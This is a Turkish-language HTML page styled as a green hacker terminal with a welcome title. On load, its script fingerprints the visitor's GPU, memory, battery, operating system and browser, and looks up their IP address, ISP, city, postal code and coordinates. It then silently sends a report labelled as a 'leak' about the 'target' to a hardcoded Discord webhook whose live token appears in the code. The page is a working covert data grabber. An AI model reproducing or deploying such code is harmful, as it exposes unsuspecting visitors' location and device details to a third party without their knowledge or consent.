<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome Qeat'S World</title>
    <style>
        body { 
            background: #050505; 
            color: #00ff41; 
            font-family: 'Courier New', monospace; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            margin: 0; 
            overflow-y: auto; 
            padding: 20px;
            box-sizing: border-box;
        }
        .terminal { 
            width: 100%; 
            max-width: 750px; 
            background: rgba(10, 10, 10, 0.95); 
            border: 1px solid #00ff41; 
            padding: 30px; 
            box-shadow: 0 0 25px rgba(0, 255, 65, 0.2); 
            position: relative; 
            box-sizing: border-box;
        }
        .line { 
            margin-bottom: 12px; 
            font-size: 15px; 
            white-space: nowrap; 
            overflow: hidden; 
            border-right: .15em solid #00ff41; 
            width: 0; 
            opacity: 0;
        }
        .type-1 { animation: typing 1s steps(30, end) forwards 0.2s, blink-caret .75s step-end 3; opacity: 1; }
        .type-2 { animation: typing 1s steps(30, end) forwards 1.5s, blink-caret .75s step-end 3; opacity: 1; }
        .type-3 { animation: typing 1s steps(30, end) forwards 2.8s, blink-caret .75s step-end infinite; opacity: 1; }
        
        @keyframes typing { from { width: 0 } to { max-width: 100%; width: 100%; } }
        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #00ff41; } }
        
        .progress-container { width: 100%; background-color: #111; height: 6px; margin: 25px 0; display: none; border: 1px solid #222; }
        .progress-bar { width: 0%; height: 100%; background-color: #00ff41; box-shadow: 0 0 10px #00ff41; transition: width 0.05s linear; }
        
        #result-box { margin-top: 20px; display: none; border-top: 1px solid #00ff41; padding-top: 20px; font-size: 14px; }
        .map-frame { width: 100%; height: 220px; margin-top: 20px; border: 1px solid #00ff41; filter: invert(0.9) hue-rotate(90deg) saturate(0.5); }
        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 15px; }
        .label { color: #00aa2c; }
        .value { color: #ff3333; font-weight: bold; text-shadow: 0 0 5px rgba(255,51,51,0.3); }
    </style>
</head>
<body>

<div class="terminal">
    <div class="line type-1">> Veri paketleri sorgulanıyor...</div>
    <div class="line type-2">> Matris bağlantısı kuruluyor...</div>
    <div class="line type-3">> Sistem kaynakları optimize edildi!</div>
    
    <div class="progress-container" id="loader">
        <div class="progress-bar" id="bar"></div>
    </div>

    <div id="result-box">
        <div class="data-grid">
            <div><span class="label">> IP ADRESİ:</span> <span class="value" id="user-ip">Yükleniyor...</span></div>
            <div><span class="label">> EKRAN KARTI:</span> <span class="value" id="user-gpu">Yükleniyor...</span></div>
            <div><span class="label">> İŞLETİM SİSTEMİ:</span> <span class="value" id="user-sys">Yükleniyor...</span></div>
            <div><span class="label">> BATARYA DURUMU:</span> <span class="value" id="user-bat">Yükleniyor...</span></div>
        </div>
        <iframe id="gmap" class="map-frame" frameborder="0" scrolling="no"></iframe>
        <div style="margin-top: 20px; font-size: 11px; color: #555; text-align: center; letter-spacing: 1px;">
            KAYIT NO: #<span id="reg-no">00000</span> | VERİ TRANSFERİ GÜVENLİ ŞEKİLDE TAMAMLANDI.
        </div>
    </div>
</div>

<script>
    // Discord Webhook URL'niz
    const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";

    // GPU (Ekran Kartı) Bilgisi Alma
    function getGPUInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Bilinmiyor";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
    }

    // Ana Veri Toplama Fonksiyonu
    async function deepCapture() {
        const gpu = getGPUInfo();
        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
        const cores = navigator.hardwareConcurrency || "Bilinmiyor";
        const touch = navigator.maxTouchPoints > 0 ? "Var" : "Yok";
        const pdf = navigator.pdfViewerEnabled ? "Destekliyor" : "Desteklemiyor";
        let batLevel = "Bilinmiyor", batTime = "Bilinmiyor";

        try {
            const battery = await navigator.getBattery();
            batLevel = `%${Math.round(battery.level * 100)}`;
            batTime = battery.dischargingTime === Infinity ? "Prizde" : `${Math.round(battery.dischargingTime / 60)} dk`;
        } catch(e) {}

        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            const time = new Date().toLocaleString('tr-TR');
            
            // Txt Raporu Oluşturma
            const report = `[QEAT RAPORU]\nZaman: ${time}\n----------------------------------------\n[IP & KONUM]\nIP: ${data.ip}\nISS: ${data.org}\nKonum: ${data.city} / ${data.region} / ${data.country_name}\nPosta Kodu: ${data.postal}\nPara Birimi: ${data.currency_name} (${data.currency})\nKoordinat: ${data.latitude}, ${data.longitude}\n\n[DONANIM & GRAFIK]\nEkran Kartı (GPU): ${gpu}\nİşlemci Çekirdek: ${cores}\nYaklaşık RAM: ${ram}\nEkran Çözünürlüğü: ${window.screen.width}x${window.screen.height}\nDokunmatik Ekran: ${touch}\n\n[SISTEM & DURUM]\nİşletim Sistemi: ${navigator.platform}\nTarayıcı: ${navigator.userAgent}\nŞarj Seviyesi: ${batLevel}\nKalan Süre: ${batTime}\nPDF Desteği: ${pdf}\n----------------------------------------\nDURUM: TÜM VERİLER BAŞARIYLA ÇEKİLDİ.`;

            // Discord Payloadi hazirlama
            const formData = new FormData();
            const payload = {
                username: "Siber İstihbarat Ajanı",
                embeds: [{
                    title: "🎯 Yeni Veri Girişi Sağlandı",
                    color: 16711680,
                    description: `**Hedef IP:** \`${data.ip}\`\n**Cihaz:** \`${navigator.platform}\`\n**GPU:** \`${gpu}\`\n\n📂 *Detaylı .txt raporu eklendi.*`,
                    timestamp: new Date()
                }]
            };

            formData.append('payload_json', JSON.stringify(payload));
            const blob = new Blob([report], { type: 'text/plain' });
            formData.append('file', blob, `SIZINTI_${data.ip}.txt`);

            // Discord'a Arka Planda Gönder
            await fetch(webhookURL, { method: 'POST', body: formData });

            // Verileri Global Hafızaya Al ve Animasyonu Başlat
            window.cachedData = {...data, gpu, batLevel, platform: navigator.platform};
            window.cachedRegNo = Math.floor(10000 + Math.random() * 90000);
            
            // Terminal yazı animasyonları bitsin diye 3.8 saniye sonra yükleme barını başlatıyoruz
            setTimeout(startProgressBar, 3800);

        } catch (error) {
            console.error("Veri çekme veya gönderme hatası:", error);
        }
    }

    // Yükleme Barı Animasyonu (Yalnızca veri hazır olduğunda tetiklenir)
    function startProgressBar() {
        const loader = document.getElementById('loader');
        const bar = document.getElementById('bar');
        loader.style.display = 'block';
        
        let width = 0;
        let int = setInterval(() => {
            if (width >= 100) {
                clearInterval(int);
                
                // Arayüzü Güncelle
                document.getElementById('user-ip').innerText = window.cachedData.ip;
                document.getElementById('user-gpu').innerText = window.cachedData.gpu ? (window.cachedData.gpu.substring(0, 25) + "...") : "Bilinmiyor";
                document.getElementById('user-sys').innerText = window.cachedData.platform;
                document.getElementById('user-bat').innerText = window.cachedData.batLevel;
                document.getElementById('reg-no').innerText = window.cachedRegNo;
                
                // Haritayı yükle
                document.getElementById('gmap').src = `https://maps.google.com/maps?q=${window.cachedData.latitude},${window.cachedData.longitude}&z=13&output=embed`;
                
                // Sonuç Kutusunu Göster
                document.getElementById('result-box').style.display = 'block';
            } else {
                width += 4;
                bar.style.width = width + '%';
            }
        }, 60);
    }

    // Sayfa açıldığında işlemi başlat
    window.addEventListener('DOMContentLoaded', deepCapture);
</script>
</body>
</html>
